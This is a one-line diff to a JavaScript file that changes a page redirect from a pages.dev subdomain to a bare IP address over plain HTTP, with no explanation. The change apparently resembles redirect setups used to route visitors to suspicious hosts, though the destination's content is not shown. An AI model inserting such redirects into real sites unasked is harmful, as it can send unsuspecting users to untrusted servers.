@@ -1,1 +1,1 @@
-window.location.replace("https://sonka.king-1ou.pages.dev");
+window.location.replace("http://156.254.172.131/");
